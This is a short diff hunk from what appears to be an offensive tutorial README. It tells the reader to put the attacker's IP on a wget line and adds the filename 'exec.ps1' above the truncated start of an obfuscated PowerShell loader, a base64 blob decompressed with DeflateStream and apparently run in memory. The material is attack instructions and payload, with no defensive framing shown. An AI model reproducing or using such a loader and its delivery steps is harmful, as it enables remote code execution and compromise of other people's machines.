@@ -102,6 +102,7 @@ On the last line where there is the ```wget``` command, put the IP of the attack
 
 The payload will look like this:
 
+exec.ps1
 ```
 sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('7Vp7cFzle...
 ```
